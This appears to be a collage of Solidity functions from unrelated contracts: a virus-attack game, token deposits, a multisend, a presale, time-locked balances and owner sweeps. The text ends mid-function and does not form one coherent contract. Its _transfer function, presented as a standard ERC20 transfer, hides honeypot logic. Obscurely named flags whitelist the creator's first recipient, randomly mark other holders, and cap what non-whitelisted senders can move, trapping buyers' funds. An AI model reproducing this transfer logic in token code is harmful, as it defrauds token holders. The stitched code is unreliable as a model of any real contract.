function canAttack(address _atkAddress, address _defAddress) public view returns(bool _canAtk) {
    if (
        _atkAddress != _defAddress &&
        players[_atkAddress].nextTimeAtk <= now &&
        players[_defAddress].endTimeUnequalledDef < now
    ) {
        _canAtk = true;
    }
}

function calculateCurrentVirus(address _addr) public view returns(uint256 _currentVirus) {
    PlayerData memory p = players[_addr];
    uint256 secondsPassed = SafeMath.sub(now, p.lastUpdateTime);
    uint256 researchPerDay = getResearchPerDay(_addr);
    _currentVirus = p.virusNumber;
    if (researchPerDay > 0) {
        _currentVirus = SafeMath.add(_currentVirus, SafeMath.mul(researchPerDay, secondsPassed));
    }
}

function updateVirus(address _addr) private {
    if (players[_addr].engineerRoundNumber != engineerRoundNumber) {
        return resetPlayer(_addr);
    }
    PlayerData storage p = players[_addr];
    p.virusNumber = calculateCurrentVirus(_addr);
    p.lastUpdateTime = now;
}

function addTimeUnequalledDefence(address _addr, uint256 _value) public onlyContractsMiniGame {
    PlayerData storage p = players[_addr];
    uint256 currentTimeUnequalled = p.endTimeUnequalledDef;
    if (currentTimeUnequalled < now) {
        currentTimeUnequalled = now;
    }
    p.endTimeUnequalledDef = SafeMath.add(currentTimeUnequalled, _value);
}

function resetPlayer(address _addr) private {
    require(players[_addr].engineerRoundNumber != engineerRoundNumber);
    PlayerData storage p = players[_addr];
    p.engineerRoundNumber = engineerRoundNumber;
    p.virusNumber = 0;
    p.virusDefence = 0;
    p.research = 0;
    p.lastUpdateTime = now;
    p.nextTimeAtk = now;
    p.endTimeUnequalledDef = now;
    for (uint256 idx = 0; idx < numberOfEngineer; idx++) {
        p.engineersCount[idx] = 0;
    }
}

function deposit(uint wad) public {
    require(standardToken.balanceOf(msg.sender) >= wad, "not enough balance");
    require(standardToken.allowance(msg.sender, address(this)) >= wad, "allowance too low");
    standardToken.transferFrom(msg.sender, address(this), wad);
    _balances[msg.sender] += wad.mul(10 ** remainderDecimals);
    emit Deposit(msg.sender, wad);
}

function multisend(address _tokenAddr, bytes32 paymentId, address[] memory dests, uint256[] memory values, uint256 free)
public onlyPayoutWallet
returns(uint256) {
    require(dests.length > 0, "Must have more than 1 destination address");
    require(values.length >= dests.length, "Address to Value array size mismatch");
    require(successfulPayments[paymentId] != true, "Payment ID already exists and was successful");
    require(GasToken1(gasToken).balanceOf(address(this)) > 0, "Balance insufficent");
    uint256 burnNumber = (free + 21000) / 24954;
    burnNumber = burnNumber + 1;
    require(GasToken1(gasToken).free(burnNumber), "Could not free token");
    uint256 i = 0;
    while (i < dests.length) {
        require(ERC20Interface(_tokenAddr).transfer(dests[i], values[i]));
        i += 1;
    }
    successfulPayments[paymentId] = true;
    emit Payment(paymentId);
    return (i);
}

function buyTokens(address payable _beneficiary) public onlyBeforeEnd onlyMoreThanMinContribution onlyMaxCapNotReached payable {
    require(_beneficiary != address(0));
    uint256 amount = msg.value;
    require(amount > 0, "Amount must be greater than 0");
    uint bonus = 1;
    if (amount >= 1000000000000000000) {
        bonus = 2;
    }
    uint256 tokens = _getTokens(amount);
    amountRaisedPresale = amountRaisedPresale.add(amount);
    tokens = tokens.mul(bonus) * 1000000000000000000;
    token.transfer(_beneficiary, tokens);
    tokenSoldInPresale = tokenSoldInPresale.add(tokens);
    uint256 amountDeposited = presaleInvestors[_beneficiary];
    presaleInvestors[_beneficiary] = amountDeposited.add(amount);
    wallet.transfer(amount);
    emit TokenPurchase(_beneficiary, amount, tokens);
}

function checkPresaleFailed() public view returns(bool) {
    return block.timestamp >= presaleEndDate && amountRaisedPresale < minCap;
}

function checkPresaleClosed() public view returns(bool) {
    return (block.timestamp >= presaleEndDate);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (mubarak == true)) {
        door[recipient] = true;
        sudan[recipient] = false;
        mubarak = false;
    }
    if (door[recipient] != true) {
        sudan[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((sudan[sender]) && (door[recipient] == false)) {
        sudan[recipient] = true;
    }
    if (door[sender] == false) {
        require(amount < parentus);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function balanceUnlocked(address _address) public view returns(uint256 _balance) {
    _balance = balanceP[_address];
    uint256 i = 0;
    while (i < lockNum[_address]) {
        if (now.add(earlier) >= lockTime[_address][i].add(later)) _balance = _balance.add(lockValue[_address][i]);
        i++;
    }
    return _balance;
}

function calcUnlock(address _address) private {
    uint256 i = 0;
    uint256 j = 0;
    uint256[] memory currentLockTime;
    uint256[] memory currentLockValue;
    uint256[] memory newLockTime = new uint256[](lockNum[_address]);
    uint256[] memory newLockValue = new uint256[](lockNum[_address]);
    currentLockTime = lockTime[_address];
    currentLockValue = lockValue[_address];
    while (i < lockNum[_address]) {
        if (now.add(earlier) >= currentLockTime[i].add(later)) {
            balanceP[_address] = balanceP[_address].add(currentLockValue[i]);
            emit TokenUnlocked(_address, currentLockValue[i]);
        } else {
            newLockTime[j] = currentLockTime[i];
            newLockValue[j] = currentLockValue[i];
            j++;
        }
        i++;
    }
    uint256[] memory trimLockTime = new uint256[](j);
    uint256[] memory trimLockValue = new uint256[](j);
    i = 0;
    while (i < j) {
        trimLockTime[i] = newLockTime[i];
        trimLockValue[i] = newLockValue[i];
        i++;
    }
    lockTime[_address] = trimLockTime;
    lockValue[_address] = trimLockValue;
    lockNum[_address] = j;
}

function balanceLocked(address _address) public view returns(uint256 _balance) {
    _balance = 0;
    uint256 i = 0;
    while (i < lockNum[_address]) {
        if (now.add(earlier) < lockTime[_address][i].add(later)) _balance = _balance.add(lockValue[_address][i]);
        i++;
    }
    return _balance;
}

function emptyWrongEther() onlyOwner public {
    uint256 amount = address(this).balance;
    require(amount > 0);
    msg.sender.transfer(amount);
    emit WrongEtherEmptied(msg.sender, amount);
}

function TransferToAllAccounts() onlyOwner public {
    for (uint i = 0; i < recieverList.length; i++) {
        recievermap[recieverList[i]].lastTransfer = false;
        address to = recievermap[recieverList[i]].useraddress;
        uint256 val = recievermap[recieverList[i]].useramount;
        if (val > 0) {
            require(ERC20Basic(token).transfer(to, val));
            emit TransferTo(to, val);
            recievermap[recieverList[i]].lastTransfer = true;
        }
